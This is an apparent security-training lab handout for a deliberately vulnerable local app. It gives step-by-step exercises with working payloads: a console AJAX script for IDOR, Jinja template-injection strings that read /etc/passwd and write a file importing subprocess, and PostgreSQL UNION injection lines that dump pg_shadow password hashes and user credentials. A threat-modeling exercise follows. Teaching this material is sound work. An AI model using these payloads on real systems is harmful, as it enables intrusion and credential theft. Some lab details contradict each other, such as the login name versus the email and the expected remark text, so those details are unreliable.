<p>Please keep the following in mind: </p>

<ul>
<li>The app is already in production and is being used by customers across multiple geographies. </li>
<li>You have a single region of availability right now on your AWS cloud deployment</li>
</ul>

<h2 id="toc_35">Insecure Direct Object Reference - AJAX</h2>

<ul>
<li>Start the WeCare Application by running the following commands: 

<ul>
<li>Open up the Terminal</li>
<li>Command: <code>stop_all_containers.sh</code></li>
<li>Command: <code>start_wecare.sh</code></li>
</ul></li>
<li>Navigate to the we care vulnerable web application by browsing the URL <code>http://localhost:9000</code> from a web browser. The web browser shortcut could be found on the desktop.</li>
<li>Login to the application as Bruce Banner with the following credentials:</li>
<li>Email: betty.ross@we45.com</li>
<li>Password: secdevops</li>
<li>Traverse to the following URL</li>
<li><code>http://localhost/record/add/</code></li>
<li>Open the Web Console by hitting Ctrl+Shift+K</li>
<li>Firefox doesn&rsquo;t allow pasting to the console by default. So you need to type <code>allow pasting</code> without pressing a Return/Enter at the end</li>
<li>Copy the following code and paste it in the web console</li>
</ul>

<div><pre><code class="language-none">function update(jsn)
 {
    $.ajax({
      type: &quot;POST&quot;,
      url: &#39;/update/record/&#39;,
      data: {
       rid: jsn,
       remarks : &#39;Diabetes&#39;,
       csrfmiddlewaretoken: &#39;&#39;,
           },
     success: function(data) {
           alert(data);
          },                
     error: function(xhr, textStatus, errorThrown) {
            alert(&quot;something went wrong&quot;);
            // alert(errorThrown)
          }
      });
 
 }
</code></pre></div>

<ul>
<li>Right click on the web browser and select View Page Source</li>
<li>Copy the <code>csrfmiddlewaretoken</code> from the page source. (hit <code>ctrl+f</code> and enter <code>csrfmiddlewaretoken</code> as the search parameter. Copy the value)</li>
<li>Paste the <code>csrfmiddlewaretoken</code> value within the single quotes in the 9th line of the payload given above</li>
<li>Type <code>update(3);</code></li>
<li>Run the command by hitting Enter/return</li>
<li>Upon running the payload web browser displays an alert Successfully updated test&rsquo;s Health Record</li>
<li>Close the web console window</li>
<li>Logout of the application</li>
<li>Login to the application with the following credentials</li>
<li>email: <strong>steve.jobs@we45.com</strong></li>
<li>password: <strong>secdevops</strong></li>
<li>Click on Health Record from the navigation panel on the left hand side</li>
<li>Now click on Health Records from the drop down list and observe the remarks column. The remarks would be the string &ldquo;injected by betty&rdquo;.</li>
</ul>

<h2 id="toc_36">Insecure Deserialization</h2>

<ul>
<li>Open up a new terminal. Run the following commands: 

<ul>
<li><code>stop_all_containers.sh</code></li>
<li><code>start_flask.sh</code></li>
</ul></li>
<li>Now open up Chrome and goto: <code>http://localhost:5050/yaml</code></li>
<li>Here, upload a file from your <code>Downloads</code> directory called <code>test_expense.yml</code></li>
<li>Observe the results</li>
</ul>

<h2 id="toc_37">Detailed Exploit - Template Injection</h2>

<ul>
<li>Open up a new terminal. Run the following commands: 

<ul>
<li><code>stop_all_containers.sh</code></li>
<li><code>start_flask.sh</code></li>
</ul></li>
<li>Open the Chrome Browser and navigate to a non-existent path: 

<ul>
<li><code>http://localhost:5050/non_existent_path</code></li>
</ul></li>
<li>Substitute the <code>non_existent_path</code> with one of the payloads below.</li>
<li>Payloads: 

<ul>
<li><code>{{ config.items() }}</code></li>
</ul></li>
</ul>

<h3 id="toc_38">Let&rsquo;s Exploit this further</h3>

<ul>
<li>Repeat the steps from above</li>
<li>Let&rsquo;s dump all the loaded python modules: 

<ul>
<li><code>{{ &#39;&#39;.__class__.__mro__[2].__subclasses__() }}</code></li>
</ul></li>
<li>Let&rsquo;s dump the /etc/passwd file: 

<ul>
<li><code>{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read() }}</code></li>
</ul></li>
<li>Let&rsquo;s write a file to the Backend OS and continue to exploit it: 

<ul>
<li><code>{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/owned.cfg&#39;, &#39;w&#39;).write(&#39;from subprocess import check_output\n\nRUNCMD = check_output\n&#39;) }}</code></li>
<li><code>{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/owned.cfg&#39;).read() }}</code></li>
</ul></li>
</ul>

<h2 id="toc_39">SQL Injection - Advanced Exploitation</h2>

<ul>
<li>Start the WeCare Application by running the following commands: 

<ul>
<li>Open up the Terminal</li>
<li>Command: <code>stop_all_containers.sh</code></li>
<li>Command: <code>start_wecare.sh</code></li>
</ul></li>
<li>Navigate to the we care vulnerable web application by browsing the URL <code>http://localhost:9000</code> from a web browser. The web browser shortcut could be found on the desktop.</li>
<li>Login to the application as Bruce Banner with the following credentials:</li>
<li>Email: <strong>bruce.banner@we45.com</strong></li>
<li>Password: <strong>secdevops</strong></li>
<li>Browse to the tests page by clicking on Tests in the navigation panel towards the left hand side.</li>
<li>Hover over the â€˜Iâ€™ and â€˜Sâ€™ buttons in the drop down list and click on them to toggle between Secure and Insecure tests page.</li>
<li>Click on the button â€˜Iâ€™ to view the insecure tests page or navigate to the URL <code>http://localhost/tests/</code></li>
<li><p>Use the following SQL injection payloads in this exercise</p>

<div><pre><code class="language-none">abcd&#39; UNION ALL SELECT NULL,(SELECT version())-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT user)-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_user)-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT getpgusername())-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_database())-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;log_connections&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;port&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;password_encryption&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;config_file&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;hba_file&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT current_setting(&#39;data_directory&#39;))-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT concat(usename,&#39; : &#39;,passwd) from pg_shadow)-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT string_agg(table_name,&#39;, &#39;) AS tables_list FROM information_schema.tables WHERE table_schema = &#39;public&#39;)-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT string_agg(column_name,&#39;, &#39;) AS columns_list FROM information_schema.columns WHERE table_schema = &#39;public&#39; AND table_name = &#39;ctf_user&#39;)-- 
abcd&#39; UNION ALL SELECT NULL,(SELECT concat(email,&#39; : &#39;,password) FROM public.ctf_user where id=2)--</code></pre></div></li>
<li><p>Each of the above is an SQL Injection payload. Copy each payload and inject them in the search parameter by pasting the payload in the search field in the top right corner. Click the search button to execute the payload</p></li>
<li><p>Observe the results</p></li>
</ul>

<h2 id="toc_40">Threat Modeling - User Story - Abuser Story - Threat Scenario</h2>

<p>We apply this example to a single feature of a particular application
Acme Legal, a new product company is developing a new cloud based application (SaaS) for customers to use. </p>

<p>This application will be used by law firms to deliver more effective and efficient services to their clients. </p>

<p>Their SaaS application is deployed on AWS with a multi-tenant architecture. Their customers are typically small and medium healthcare institutions that manage everything from Appointment Scheduling to Client Management within Acme&rsquo;s application. As you can imagine, one of the key concerns of Acme&rsquo;s customers is Security.</p>

<p>As part of their first two agile sprints, they are taking up the following User Stories for Development </p>

<ul>
<li>As a client, I would like to login to the portal to gain access to my account and setup appointments, etc</li>
<li>As a client I would like to setup appointments with a lawyer, so I can visit my doctor with a predefined appointment at a given time and date</li>
<li>As a client I would like to pay for my appointment with my credit card, so I can complete the appointment process. </li>
</ul>

<p>You already have user stories. You need to: </p>

<ul>
<li>Define Abuser Stories for each user story. Define atleast 1 abuser story per user story</li>
<li>Define atleast two threat scenarios against each abuser story</li>
<li>Identify testing practices that you would use for each threat scenario. Don&rsquo;t worry if they repeat. That&rsquo;s perfectly valid.</li>
</ul>




</body>

</html>
